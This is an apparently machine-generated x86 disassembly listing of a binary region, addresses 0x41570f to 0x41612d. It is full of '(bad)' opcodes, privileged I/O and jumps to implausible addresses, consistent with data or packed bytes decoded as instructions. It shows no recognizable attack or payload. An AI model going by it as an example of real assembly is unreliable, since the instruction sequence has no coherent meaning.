  41570f:	mov    dh,BYTE PTR [esi-0x707194cd]
  415715:	and    DWORD PTR [ebx],esi
  415717:	std    
  415718:	std    
  415719:	repz out dx,al
  41571b:	mov    dh,0x79
  41571d:	sbb    eax,0x7184c31f
  415722:	les    esi,FWORD PTR [edi+0x29]
  415725:	pop    eax
  415726:	dec    edx
  415727:	imul   ebx,esi,0x1e
  41572a:	call   0x3413:0xb624f3e6
  415731:	xor    al,0x4f
  415733:	jne    0x4156ec
  415735:	ret    0xb856
  415738:	mov    esp,DWORD PTR [esi-0x2a0a7a07]
  41573e:	or     eax,0xf64ba055
  415743:	pop    edx
  415744:	arpl   bx,si
  415746:	adc    al,0x8c
  415748:	(bad)  
  41574a:	sbb    BYTE PTR [eax+eax*4],ah
  41574d:	push   ecx
  41574f:	pop    edi
  415750:	es mov ecx,0x73503ea5
  415756:	cld    
  415757:	test   ah,ch
  415759:	stos   DWORD PTR es:[edi],eax
  41575a:	push   0x5d
  41575c:	pop    es
  41575d:	push   esi
  41575e:	bound  esi,QWORD PTR [edi]
  415760:	retf   
  415761:	pop    ecx
  415762:	(bad)  
  415763:	sahf   
  415764:	das    
  415765:	jle    0x41572b
  415767:	aas    
  415768:	(bad)  
  415769:	aad    0xc4
  41576b:	lods   al,BYTE PTR ds:[esi]
  41576c:	lds    edi,FWORD PTR [edx-0x34]
  41576f:	shr    BYTE PTR [ebx+eax*8+0x77ad91e1],1
  415776:	pop    ebp
  415777:	adc    esi,eax
  415779:	adc    DWORD PTR [eax-0x1e3427e7],edx
  41577f:	rcr    DWORD PTR [edi],0xdb
  415782:	hlt    
  415783:	sub    al,0x94
  415785:	inc    eax
  415786:	dec    ebp
  415787:	and    ah,bh
  415789:	fldcw  WORD PTR [ebp+edi*8+0x48c0c13]
  415790:	adc    cl,al
  415792:	iret   
  415793:	pushf  
  415794:	mov    eax,0x6666c95f
  415799:	or     ebx,edi
  41579b:	outs   dx,DWORD PTR ds:[esi]
  41579c:	pop    edi
  41579d:	(bad)  
  41579e:	dec    ebp
  41579f:	mov    DWORD PTR ds:0x78fb7a0b,eax
  4157a5:	cs ds dec esp
  4157a8:	inc    esi
  4157a9:	repnz push 0xf3353309
  4157af:	ror    BYTE PTR [eax-0x2f],cl
  4157b2:	rol    DWORD PTR [ebp+0x3d],1
	...
  415814:	add    BYTE PTR [eax],al
  415816:	retf   
  415817:	(bad)  
  415818:	xchg   ebx,eax
  415819:	in     al,dx
  41581a:	mov    bh,0xed
  41581c:	(bad)  
  41581d:	inc    DWORD PTR [ecx+0x45ae69e3]
  415823:	jmp    0x4157dc
  415825:	aas    
  415826:	fs loopne 0x415829
  415829:	add    BYTE PTR [edi],al
  41582b:	add    DWORD PTR [eax],eax
  41582d:	add    BYTE PTR [eax-0x6e],ch
  415830:	(bad)  
  415831:	retf   0x5aae
  415834:	lock mov bl,0x14
  415837:	jmp    0x47e5:0x48c00352
  41583e:	lock mov al,ds:0x2dcf8f71
  415844:	mov    ch,0xf7
  415846:	and    esp,DWORD PTR [esi]
  415848:	test   BYTE PTR [eax+0x47],cl
  41584b:	xor    ch,BYTE PTR [eax]
  41584d:	and    al,0x5f
  41584f:	pop    edi
  415850:	sbb    cl,BYTE PTR [esi]
  415852:	nop
  415853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415854:	xlat   BYTE PTR ds:[ebx]
  415855:	jnp    0x415869
  415857:	das    
  415858:	(bad)
  41585b:	sub    eax,0xde43bebd
  415860:	out    dx,eax
  415861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415862:	int    0x4d
  415864:	mov    cl,0xc3
  415866:	mov    dl,0x3a
  415868:	adc    dh,0x3
  41586b:	xchg   ecx,eax
  41586c:	mov    esp,0xaae071e7
  415871:	fs out 0x16,eax
  415874:	jnp    0x4158a6
  415876:	ja     0x41589c
  415878:	inc    esp
  415879:	adc    al,0xf0
  41587b:	cmp    dl,al
  41587d:	and    edx,DWORD PTR [ebp+ecx*1+0x6c501157]
  415884:	ret    0xd59f
  415887:	cmp    BYTE PTR [edi-0x345940de],bl
  41588d:	loop   0x415870
  41588f:	repnz add eax,esi
  415892:	dec    ebx
  415893:	pop    ebx
  415894:	inc    edi
  415895:	push   ebp
  415896:	pop    es
  415897:	mov    al,ds:0xb9abb830
  41589c:	jg     0x4158a6
  41589e:	and    DWORD PTR ds:0xa841d232,ecx
  4158a4:	mov    esi,0x11996acd
  4158a9:	pop    edi
  4158aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158ab:	sahf   
  4158ac:	stc    
  4158ad:	lds    edi,FWORD PTR [esi+0x46]
  4158b0:	test   DWORD PTR [edx+0x4af90a96],edi
  4158b6:	mov    edi,0x6d11209b
  4158bb:	aas    
  4158bc:	jbe    0x4158e1
  4158be:	rcr    BYTE PTR [ebp-0x19],cl
  4158c1:	mov    dl,0x3
  4158c3:	das    
  4158c4:	xor    ch,ah
  4158c6:	xchg   DWORD PTR [eax],esi
  4158c8:	rcr    DWORD PTR [eax+0x3049c7b0],0x20
  4158cf:	xchg   edi,eax
  4158d0:	push   cs
  4158d1:	adc    al,BYTE PTR [ebx]
  4158d3:	lahf   
  4158d4:	adc    ch,BYTE PTR [ebp-0x766243d4]
  4158da:	cmp    eax,0x4a9b8be7
  4158df:	mov    ebx,0x1aa4f4b1
  4158e5:	lods   al,BYTE PTR ds:[esi]
  4158e6:	and    DWORD PTR [ecx+edi*1],ecx
  4158e9:	jl     0x415934
  4158eb:	pop    edx
  4158ec:	inc    ebp
  4158ed:	dec    edi
  4158ee:	shl    cl,1
  4158f0:	push   0x60
  4158f2:	ins    DWORD PTR es:[edi],dx
  4158f3:	pop    eax
  4158f4:	push   ds
  4158f5:	icebp  
  4158f6:	mov    esp,0x5cb94176
  4158fb:	call   0xb321089c
  415900:	ds dec ecx
  415902:	pop    edi
  415903:	pop    ds
  415904:	(bad)  
  415905:	sbb    al,0xc
  415907:	fidiv  DWORD PTR [eax]
  415909:	cmp    DWORD PTR ds:0x1378a223,esp
  41590f:	out    0xd7,al
  415911:	xor    eax,0x269cb0b8
  415916:	jmp    0x74421c45
  41591b:	or     BYTE PTR [eax+0x1a],bh
  41591e:	js     0x4158f5
  415920:	push   0xffffffb7
  415922:	test   al,0x64
  415924:	pop    ecx
  415925:	loop   0x41598b
  415927:	cld    
  415928:	jmp    0xf86fa550
  41592d:	std    
  41592e:	mov    es,WORD PTR [ecx-0x7b]
  415931:	call   0x6a1298
	...
  415996:	inc    ebp
  415997:	mov    BYTE PTR [edi+esi*2],ch
  41599a:	in     eax,dx
  41599b:	neg    DWORD PTR [edi-0x46]
  41599e:	es jge 0x415944
  4159a1:	int    0x43
  4159a3:	(bad)
  4159a7:	loope  0x4159a9
  4159a9:	add    BYTE PTR [edi],al
  4159ab:	add    DWORD PTR [eax],eax
  4159ad:	add    BYTE PTR [edi+0x25],ah
  4159b0:	mov    ebp,0xb4d72557
  4159b5:	lods   eax,DWORD PTR ds:[esi]
  4159b6:	push   ebp
  4159b7:	xchg   ecx,eax
  4159b8:	adc    DWORD PTR [ebp-0x555fdb25],ecx
  4159be:	jae    0x4159cb
  4159c0:	aad    0x90
  4159c2:	sbb    eax,0x2832d65b
  4159c7:	mov    bl,BYTE PTR [ecx]
  4159c9:	fmul   DWORD PTR [edx]
  4159cb:	loope  0x415a47
  4159cd:	pop    esp
  4159ce:	add    eax,0xf9675ae0
  4159d3:	ja     0x415a2a
  4159d5:	mov    al,al
  4159d7:	rcl    DWORD PTR [edi+ecx*2+0x39],cl
  4159db:	cmc    
  4159dc:	adc    al,0x3c
  4159de:	mov    bl,0x92
  4159e0:	test   BYTE PTR [ebx-0x50eecf22],dl
  4159e6:	sub    bh,BYTE PTR [ebx]
  4159e8:	adc    bh,BYTE PTR [edx-0x19]
  4159eb:	shr    BYTE PTR [eax+0x4e],1
  4159ee:	sub    esp,ecx
  4159f0:	sti    
  4159f1:	in     al,0x11
  4159f3:	pusha  
  4159f4:	xchg   ebp,eax
  4159f5:	jo     0x415a67
  4159f7:	push   ss
  4159f8:	push   ebp
  4159f9:	pop    eax
  4159fa:	enter  0x20f0,0x4
  4159fe:	and    al,0x30
  415a00:	aad    0x2c
  415a02:	lods   al,BYTE PTR ds:[esi]
  415a03:	adc    BYTE PTR cs:[esi-0x53],dh
  415a07:	inc    eax
  415a08:	loope  0x415a6f
  415a0a:	das    
  415a0b:	push   ds
  415a0c:	mov    ecx,0xd1002680
  415a11:	lahf   
  415a12:	nop
  415a13:	gs stos DWORD PTR es:[edi],eax
  415a15:	call   0xd2b7a784
  415a1a:	pop    ebx
  415a1b:	inc    ebx
  415a1c:	sbb    eax,0x65db294c
  415a21:	int    0x89
  415a23:	int3   
  415a24:	add    ebp,DWORD PTR [ebx]
  415a26:	push   ecx
  415a27:	repnz adc cl,BYTE PTR [edx]
  415a2a:	daa    
  415a2b:	les    edi,FWORD PTR cs:[ecx-0xb2ba4ba]
  415a32:	fld    DWORD PTR [ecx]
  415a34:	cmp    ah,BYTE PTR [ebp+0xe]
  415a37:	xchg   esp,eax
  415a38:	adc    dl,BYTE PTR [eax-0x37]
  415a3b:	adc    al,0xfb
  415a3d:	mov    ch,0x18
  415a3f:	shl    BYTE PTR [eax+0x57],0xfa
  415a43:	outs   dx,BYTE PTR ds:[esi]
  415a44:	in     eax,dx
  415a45:	jmp    0x4a721bb2
  415a4a:	fisubr WORD PTR ds:0x4b0f6a16
  415a50:	adc    BYTE PTR [edx+0x46c22ed9],ah
  415a56:	arpl   bx,sp
  415a58:	(bad)  
  415a59:	mov    esp,0xa2ac555b
  415a5e:	js     0x4159f4
  415a60:	pusha  
  415a61:	push   ebp
  415a62:	pop    ecx
  415a63:	fwait
  415a64:	sub    ch,bl
  415a66:	popa   
  415a67:	punpcklwd mm4,DWORD PTR [edi+0x2bd10749]
  415a6e:	repnz mov ecx,0x881c73d9
  415a74:	mov    al,bl
  415a76:	aam    0x7a
  415a78:	inc    esp
  415a79:	mov    ch,0x13
  415a7b:	xchg   esi,eax
  415a7c:	cdq    
  415a7d:	sbb    BYTE PTR [ebp-0x5d085dcf],0xf5
  415a84:	and    DWORD PTR [esi],ecx
  415a86:	in     al,dx
  415a87:	mov    ds,WORD PTR [esi+0x5072e5df]
  415a8d:	push   edx
  415a8e:	xchg   esi,eax
  415a8f:	ficom  WORD PTR [edi+0x2cef90dc]
  415a95:	push   ebx
  415a96:	nop
  415a97:	jg     0x415ac8
  415a99:	xchg   ebp,eax
  415a9a:	pop    es
  415a9b:	sbb    DWORD PTR [eax+0x49],esp
  415a9e:	shl    DWORD PTR [ecx+0x51],0x85
  415aa2:	mov    ecx,0x49427764
  415aa7:	jns    0x415a40
  415aa9:	push   cs
  415aaa:	xor    esi,esp
  415aac:	jne    0x415b0d
  415aae:	mov    edx,0xd0d93c1a
  415ab3:	pop    ebx
  415ab4:	dec    esp
	...
  415b15:	add    bh,bl
  415b17:	mov    esi,0xbb659205
  415b1c:	(bad)  
  415b1e:	jge    0x415aff
  415b20:	nop
  415b21:	mov    al,ds:0x98c76e14
  415b26:	jb     0x415b0a
  415b28:	add    BYTE PTR [eax],al
  415b2a:	pop    es
  415b2b:	add    DWORD PTR [eax],eax
  415b2d:	add    bl,dh
  415b2f:	jge    0x415b67
  415b31:	mov    esp,0x2889c13b
  415b36:	popa   
  415b37:	test   eax,0xb030fee2
  415b3c:	into   
  415b3d:	inc    ecx
  415b3e:	xchg   esp,eax
  415b3f:	ffree  st(4)
  415b41:	ss mov edi,0x3df27252
  415b47:	rcl    esp,cl
  415b49:	mov    eax,0x9d962155
  415b4e:	pop    esp
  415b4f:	add    ecx,DWORD PTR [edx+eiz*2]
  415b52:	sti    
  415b53:	daa    
  415b54:	stc    
  415b55:	sub    eax,0x708cf656
  415b5a:	lds    ebx,FWORD PTR [ebx]
  415b5c:	fidivr WORD PTR [ebx-0x688d071]
  415b62:	jb     0x415b1a
  415b64:	sbb    al,0x53
  415b66:	pop    es
  415b67:	and    al,0x6b
  415b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b6a:	jno    0x415b96
  415b6c:	inc    esi
  415b6d:	fwait
  415b6e:	jmp    0x415b52
  415b70:	lock and ebx,eax
  415b73:	pop    ss
  415b74:	mov    eax,ds:0x9fad0e9c
  415b79:	add    BYTE PTR [esp+eax*4-0x60],dl
  415b7d:	mov    BYTE PTR [ecx-0x16cee2b1],dh
  415b83:	test   eax,0xf8f04d18
  415b88:	or     DWORD PTR [edx-0x43],esi
  415b8b:	dec    ebp
  415b8c:	fs inc ebx
  415b8e:	mov    ch,0xaa
  415b90:	cmp    al,bl
  415b92:	push   esi
  415b93:	sub    DWORD PTR [ecx+0x468f93ea],ebp
  415b99:	shl    esi,1
  415b9b:	(bad)  
  415b9c:	mov    bh,0x8d
  415b9e:	adc    eax,0x10dbdd00
  415ba3:	cmp    eax,0x35fbb918
  415ba8:	ss cmp ecx,edx
  415bab:	sti    
  415bac:	rol    BYTE PTR [eax+esi*1-0x9e70cd2],1
  415bb3:	inc    ebp
  415bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bb5:	lods   al,BYTE PTR ds:[esi]
  415bb6:	leave  
  415bb7:	jg     0x415c06
  415bb9:	push   es
  415bba:	sbb    esi,DWORD PTR [eax-0x61]
  415bbd:	popa   
  415bbe:	adc    DWORD PTR [ebx+0x3f9afdac],ebx
  415bc4:	(bad)  
  415bc5:	dec    BYTE PTR [edx+0x6]
  415bc8:	and    ecx,DWORD PTR es:[ebp-0x64]
  415bcc:	(bad)  
  415bcd:	(bad)  
  415bce:	jbe    0x415c02
  415bd0:	mov    esi,0x7ad357ca
  415bd5:	in     al,dx
  415bd6:	mov    ebp,0xbf8bb69c
  415bdb:	mov    ebx,DWORD PTR [esp+ebp*4+0x5236b5e7]
  415be2:	aam    0xf4
  415be4:	push   DWORD PTR [edx]
  415be6:	inc    ebp
  415be7:	test   DWORD PTR [edx-0x29fe863e],edi
  415bed:	lods   al,BYTE PTR ds:[si]
  415bef:	lods   eax,DWORD PTR ds:[esi]
  415bf0:	sti    
  415bf1:	mov    WORD PTR [edi],?
  415bf3:	mov    WORD PTR [esi+0x51],es
  415bf6:	add    BYTE PTR [esi],ah
  415bf8:	dec    ebx
  415bf9:	mov    edi,0xcbc0d215
  415bfe:	(bad)  
  415c00:	out    dx,eax
  415c01:	push   edi
  415c02:	(bad)  
  415c03:	lods   al,BYTE PTR ds:[esi]
  415c04:	fst    st(1)
  415c06:	add    DWORD PTR [ecx+0x28b6e1a7],edx
  415c0c:	(bad)  
  415c0d:	xlat   BYTE PTR ds:[ebx]
  415c0e:	aaa    
  415c0f:	cmp    BYTE PTR [edi],0xf6
  415c12:	dec    edi
  415c13:	cmp    DWORD PTR [ebx+0x65],0xc14dd590
  415c1a:	sbb    edi,ebp
  415c1c:	adc    ecx,DWORD PTR [edx+0x74bf824c]
  415c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c23:	dec    ecx
  415c24:	or     DWORD PTR [ecx+0x75c3f791],edi
  415c2a:	das    
  415c2b:	fbstp  TBYTE PTR [ebx]
  415c2d:	int3   
  415c2e:	push   edx
  415c2f:	sub    BYTE PTR [esi-0x5805e152],ah
	...
  415c95:	add    BYTE PTR [edx],bh
  415c97:	adc    BYTE PTR [edi-0x444040c4],bh
  415c9d:	push   ss
  415c9e:	jno    0x415d07
  415ca0:	mov    esi,0x7799f90f
  415ca5:	pop    eax
  415ca6:	jns    0x415c8b
  415ca8:	add    BYTE PTR [eax],al
  415caa:	pop    es
  415cab:	add    DWORD PTR [eax],eax
  415cad:	add    BYTE PTR [esi-0x2029cde3],ch
  415cb3:	mov    ebp,0xb40182b9
  415cb8:	int3   
  415cb9:	sub    al,BYTE PTR [ebp-0x75858ff1]
  415cbf:	in     eax,dx
  415cc0:	ja     0x415d16
  415cc2:	mov    cl,0x1c
  415cc4:	ins    DWORD PTR es:[edi],dx
  415cc5:	mov    ch,0xd3
  415cc7:	push   0xffffffa4
  415cc9:	fstp   st(1)
  415ccb:	mov    ah,0x4d
  415ccd:	cwde   
  415cce:	cs sub eax,0x446af183
  415cd4:	aam    0xce
  415cd6:	mov    WORD PTR [esi+0x5a],ds
  415cd9:	call   0xb3bb223c
  415cde:	push   esi
  415cdf:	cmp    DWORD PTR [ebx-0x5f807a01],0x450cf9ee
  415ce9:	sub    BYTE PTR [ebx],cl
  415ceb:	mov    bl,0x82
  415ced:	mov    edi,0x3efb7013
  415cf2:	cli    
  415cf3:	sbb    DWORD PTR [esi],edx
  415cf5:	xchg   esp,eax
  415cf6:	out    0x2a,eax
  415cf8:	cmp    DWORD PTR [edx-0x78],0x93fd62ea
  415cff:	inc    esi
  415d00:	xor    ebp,DWORD PTR [esi+0x7c51b4ee]
  415d06:	in     al,dx
  415d07:	cmc    
  415d08:	cvtdq2ps xmm5,XMMWORD PTR [ecx-0x32]
  415d0c:	fcom   DWORD PTR [edi+0x20c79c70]
  415d12:	cs jo  0x415d3a
  415d15:	idiv   DWORD PTR [esi-0x18d8a03b]
  415d1b:	int3   
  415d1c:	rcl    ebx,1
  415d1e:	mov    esi,0x7148c3b7
  415d23:	icebp  
  415d24:	adc    DWORD PTR [ecx+0x59],esi
  415d27:	ins    BYTE PTR es:[edi],dx
  415d28:	scas   eax,DWORD PTR es:[edi]
  415d29:	jo     0x415d42
  415d2b:	adc    DWORD PTR [esi-0x36d36fac],esi
  415d31:	mov    ebx,0xbb88ebf9
  415d36:	jbe    0x415d8a
  415d38:	scas   eax,DWORD PTR es:[edi]
  415d39:	pop    eax
  415d3a:	jl     0x415d23
  415d3c:	dec    eax
  415d3d:	pop    ds
  415d3e:	mov    ecx,0x5f1196f5
  415d43:	pop    edi
  415d44:	out    0x72,eax
  415d46:	inc    eax
  415d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d48:	les    ecx,FWORD PTR [eax]
  415d4a:	fidivr DWORD PTR [edx]
  415d4c:	stos   BYTE PTR es:[edi],al
  415d4d:	adc    DWORD PTR [ebx+0x3fe4cc66],ebp
  415d53:	adc    al,0x6c
  415d55:	push   ds
  415d56:	xchg   edx,eax
  415d57:	fisub  WORD PTR [ecx-0x6f]
  415d5a:	dec    ecx
  415d5b:	leave  
  415d5c:	fidiv  DWORD PTR [eax-0x71]
  415d5f:	or     ebx,DWORD PTR [edx+0x59484d66]
  415d65:	xor    BYTE PTR [ebx-0x50],ah
  415d68:	adc    ah,BYTE PTR [ebx-0x8c14d56]
  415d6e:	xchg   edx,eax
  415d6f:	scas   eax,DWORD PTR es:[edi]
  415d70:	lahf   
  415d71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d72:	jp     0x415d73
  415d74:	mov    al,0xd
  415d76:	jb     0x415d7d
  415d78:	int    0x4c
  415d7a:	pop    esi
  415d7b:	or     ah,ah
  415d7d:	mov    al,ds:0x960dca5c
  415d82:	jae    0x415d68
  415d84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d85:	cmp    BYTE PTR ds:0x717402e2,0x2
  415d8c:	sbb    DWORD PTR [ebx+0x30],ebx
  415d8f:	sub    bl,BYTE PTR [ecx+0x39]
  415d92:	cmp    eax,0x560a7252
  415d97:	fwait
  415d98:	cmp    BYTE PTR ds:[ecx],ah
  415d9b:	or     ebx,ecx
  415d9d:	dec    si
  415d9f:	(bad)
  415da2:	cmp    bl,BYTE PTR [eax+0x6a]
  415da5:	addr16 sub eax,0x36754c7c
  415dab:	mov    gs,edx
  415dad:	and    BYTE PTR [ebp+0x4144b55b],ch
  415db3:	pop    esi
  415db4:	in     eax,0x0
	...
  415e16:	out    dx,al
  415e17:	repnz cmc 
  415e19:	add    edi,ebp
  415e1b:	pop    es
  415e1c:	(bad)  
  415e1d:	call   DWORD PTR [eax]
  415e1f:	mov    eax,ds:0x1d9c5606
  415e24:	bound  ebx,QWORD PTR [ebp-0x80]
  415e27:	in     al,0x0
  415e29:	add    BYTE PTR [edi],al
  415e2b:	add    DWORD PTR [eax],eax
  415e2d:	add    ch,bl
  415e2f:	retf   
  415e30:	dec    ebx
  415e31:	ins    DWORD PTR es:[edi],dx
  415e32:	mov    ds:0x21d0453f,al
  415e37:	inc    edx
  415e38:	in     al,dx
  415e39:	in     eax,0x2c
  415e3b:	jle    0x415dce
  415e3d:	cmp    al,0xf2
  415e3f:	inc    bl
  415e41:	sub    DWORD PTR [ebx-0x7f],esp
  415e44:	add    ah,ch
  415e46:	or     eax,0x8ff83d5f
  415e4b:	pop    esi
  415e4c:	and    al,0xf4
  415e4e:	inc    ebx
  415e4f:	adc    DWORD PTR [edx+0x4c3ccc],esp
  415e55:	sbb    DWORD PTR [ebx-0x35068387],0x2d
  415e5c:	hlt    
  415e5d:	xlat   BYTE PTR ds:[ebx]
  415e5e:	clc    
  415e5f:	pop    ebp
  415e60:	je     0x415e61
  415e62:	fidiv  WORD PTR [eax]
  415e64:	push   edx
  415e65:	or     DWORD PTR [esi-0x53],edi
  415e68:	add    ebp,edx
  415e6a:	cld    
  415e6b:	js     0x415ea2
  415e6d:	arpl   WORD PTR [ebx],dx
  415e6f:	sbb    DWORD PTR [ecx+0x14],ebx
  415e72:	jbe    0x415ee6
  415e74:	adc    edx,DWORD PTR [ecx-0x40b0121f]
  415e7a:	sub    al,0xa
  415e7c:	lea    edx,[edi+0x14]
  415e7f:	les    ebp,FWORD PTR [edx+eax*1]
  415e82:	cmp    ebp,DWORD PTR [eax]
  415e84:	rcr    DWORD PTR [eax-0x5dd6588a],cl
  415e8a:	js     0x415ec7
  415e8c:	jge    0x415ec0
  415e8e:	stc    
  415e8f:	ins    BYTE PTR es:[edi],dx
  415e90:	retf   
  415e91:	xor    edx,DWORD PTR [eax+0x3a]
  415e94:	js     0x415ef8
  415e96:	pop    es
  415e97:	fld    DWORD PTR [edx-0x22]
  415e9a:	lea    esi,[edi]
  415e9c:	push   esi
  415e9d:	pop    edi
  415e9e:	and    BYTE PTR [esi+0x13],dh
  415ea1:	xor    al,0x7e
  415ea3:	mov    ebp,0xd2dde6d6
  415ea8:	sahf   
  415ea9:	xchg   ecx,eax
  415eaa:	cdq    
  415eab:	(bad)  
  415eac:	or     ebx,0x36
  415eaf:	mov    esi,DWORD PTR [edi+0x652f1762]
  415eb5:	repz xchg edi,eax
  415eb7:	xchg   ebp,eax
  415eb8:	(bad)  
  415eb9:	push   ds
  415eba:	fcmovnbe st,st(0)
  415ebc:	mov    ds,WORD PTR [esi+ebx*2]
  415ebf:	js     0x415ed2
  415ec1:	fld    TBYTE PTR [eax+ecx*4+0x6c]
  415ec5:	and    esp,DWORD PTR [ecx+0x7e]
  415ec8:	ins    BYTE PTR es:[edi],dx
  415ec9:	and    al,0x4a
  415ecb:	test   DWORD PTR [ebp+0x5db6a5e9],edx
  415ed1:	push   0xffffffdd
  415ed3:	and    esp,ecx
  415ed5:	lahf   
  415ed6:	inc    eax
  415ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ed8:	inc    ebp
  415ed9:	aaa    
  415eda:	mov    bl,0xca
  415edc:	mov    BYTE PTR [ecx],ah
  415ede:	(bad)  
  415edf:	pushf  
  415ee0:	ds scas eax,DWORD PTR es:[edi]
  415ee2:	out    dx,eax
  415ee3:	pushf  
  415ee4:	mov    eax,DWORD PTR [ecx+0x4652f45b]
  415eea:	scas   al,BYTE PTR es:[edi]
  415eeb:	pop    ecx
  415eec:	int3   
  415eed:	cmp    edi,DWORD PTR [edi+0x139d9f18]
  415ef3:	lods   al,BYTE PTR ds:[esi]
  415ef4:	rol    DWORD PTR [edx],1
  415ef6:	sbb    al,0xf1
  415ef8:	sbb    bh,dl
  415efa:	clc    
  415efb:	mov    al,0xcd
  415efd:	dec    ebx
  415efe:	(bad)  
  415f00:	sbb    ebp,DWORD PTR [ebx+0x49566387]
  415f06:	cmc    
  415f07:	mov    BYTE PTR [edx+0x41ce7011],ch
  415f0d:	aam    0x93
  415f0f:	sti    
  415f10:	outs   dx,BYTE PTR ds:[esi]
  415f11:	dec    edx
  415f12:	ja     0x415f70
  415f14:	pop    edi
  415f15:	jns    0x415ee7
  415f17:	cld    
  415f18:	aad    0xb2
  415f1a:	or     bl,BYTE PTR [ebp*4+0x5b96e84b]
  415f21:	lods   al,BYTE PTR ds:[esi]
  415f22:	sbb    eax,0x14734f06
  415f27:	fidiv  DWORD PTR [ecx]
  415f29:	and    BYTE PTR [eax],dl
  415f2b:	pop    ds
  415f2c:	scas   al,BYTE PTR es:[edi]
  415f2d:	leave  
  415f2e:	inc    esp
  415f2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f30:	sbb    eax,0x29c84158
	...
  415f95:	add    BYTE PTR [edi],dl
  415f97:	mov    BYTE PTR [esi-0x6e],ch
  415f9a:	push   esi
  415f9c:	dec    DWORD PTR [ebp+0x1b0aa13e]
  415fa2:	ror    BYTE PTR [edi],cl
  415fa4:	xchg   edi,eax
  415fa5:	ja     0x7416090
  415fab:	add    DWORD PTR [eax],eax
  415fad:	add    BYTE PTR [ecx+0x3f],dh
  415fb0:	or     BYTE PTR [eax],0x6b
  415fb3:	shl    BYTE PTR [eax+ebx*4+0x57],0xcf
  415fb8:	(bad)  
  415fb9:	out    dx,eax
  415fba:	outs   dx,BYTE PTR ds:[esi]
  415fbb:	enter  0x7e9e,0x54
  415fbf:	test   BYTE PTR ds:0x3cff6c44,dh
  415fc5:	xchg   edx,eax
  415fc6:	xchg   edx,eax
  415fc7:	push   ebx
  415fc8:	jne    0x415fc8
  415fca:	add    eax,0x7744f97c
  415fcf:	lahf   
  415fd0:	fcomp  DWORD PTR [edi+eiz*8-0x10c7fb36]
  415fd7:	addr16 xchg ecx,eax
  415fd9:	inc    eax
  415fda:	cmp    ch,BYTE PTR [edi+0x30]
  415fdd:	fnstcw WORD PTR [esi+0x2e]
  415fe0:	inc    edx
  415fe1:	push   edi
  415fe2:	add    eax,DWORD PTR [ebx]
  415fe4:	push   ds
  415fe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fe6:	fiadd  DWORD PTR [edx+0x4a5ec41f]
  415fec:	push   ds
  415fed:	xor    al,0x8f
  415fef:	test   DWORD PTR [edi],esi
  415ff1:	mov    ecx,0xd568c528
  415ff6:	jmp    0x7b6f:0xc143673e
  415ffd:	jge    0x41606c
  415fff:	jmp    0x415fb3
  416001:	fdivr  QWORD PTR [edx]
  416003:	imul   ebx,DWORD PTR [edx-0x1bc560b],0x6b
  41600a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41600b:	dec    ebx
  41600c:	xchg   ebp,eax
  41600d:	mov    al,0xd2
  41600f:	les    ecx,FWORD PTR [ebp-0x46]
  416012:	mov    dh,0xf6
  416014:	add    ch,al
  416016:	ja     0x415ff0
  416018:	rcl    BYTE PTR [eax],cl
  41601a:	inc    ebx
  41601b:	adc    esi,ebp
  41601d:	or     BYTE PTR [edi],dh
  41601f:	mov    ?,WORD PTR [ebx]
  416021:	aad    0x9a
  416023:	mov    ds:0xd604c7a1,al
  416028:	mov    ebx,0xb699ca39
  41602d:	inc    edx
  41602e:	and    bl,ch
  416030:	es pop ss
  416032:	adc    BYTE PTR [edi+0x65a95e71],dl
  416038:	pop    ebx
  416039:	push   edx
  41603a:	mov    ecx,0x2341c3f7
  41603f:	clc    
  416040:	inc    ebx
  416041:	outs   dx,BYTE PTR ds:[esi]
  416042:	(bad)  
  416043:	and    esi,edi
  416045:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416046:	push   esi
  416047:	pop    ecx
  416048:	ds add al,0x32
  41604b:	int    0x50
  41604d:	pop    edi
  41604e:	fistp  DWORD PTR [esi+0x15]
  416051:	cdq    
  416052:	fmul   DWORD PTR [edx-0x42]
  416055:	cli    
  416056:	cmp    DWORD PTR [esi+eiz*4],ecx
  416059:	push   cs
  41605a:	ret    0xf756
  41605d:	jecxz  0x416073
  41605f:	scas   al,BYTE PTR es:[edi]
  416060:	cmp    BYTE PTR cs:[eax-0x33],ah
  416064:	out    dx,al
  416065:	adc    BYTE PTR [eax+0x15e5a866],ch
  41606b:	inc    ebp
  41606c:	pushf  
  41606d:	push   es
  41606e:	hlt    
  41606f:	pop    esi
  416070:	sub    eax,0x5dc87477
  416075:	jmp    0xb459:0x344c3ebc
  41607c:	fistp  DWORD PTR ds:[ebp+eax*2+0x59217ead]
  416084:	test   esi,edx
  416086:	xchg   edx,eax
  416087:	cmp    BYTE PTR [esi+0x593e1065],al
  41608d:	(bad)  
  41608e:	jae    0x4160e4
  416090:	retf   
  416091:	lods   eax,DWORD PTR ds:[esi]
  416092:	mov    eax,ds:0xd90c2f18
  416097:	not    DWORD PTR ds:0x71a86335
  41609d:	pop    esp
  41609e:	pop    ebp
  41609f:	jne    0x4160ed
  4160a1:	shr    BYTE PTR [ebp+0x42],1
  4160a4:	xor    esp,ebp
  4160a6:	xor    esp,0xbc20202c
  4160ac:	addr16 icebp 
  4160ae:	scas   eax,DWORD PTR es:[edi]
  4160af:	adc    al,0x3d
  4160b1:	hlt    
  4160b2:	mov    ah,0xd8
  4160b4:	adc    BYTE PTR [eax],al
	...
  416116:	and    cl,ch
  416118:	cmp    ebx,esi
  41611a:	sti    
  41611b:	fsubrp st(5),st
  41611d:	jmp    DWORD PTR [edx]
  41611f:	fwait
  416120:	xchg   DWORD PTR [ecx],edx
  416122:	and    BYTE PTR [eax-0x19713de9],ch
  416128:	add    BYTE PTR [eax],al
  41612a:	pop    es
  41612b:	add    DWORD PTR [eax],eax
  41612d:	add    BYTE PTR [ebx],al
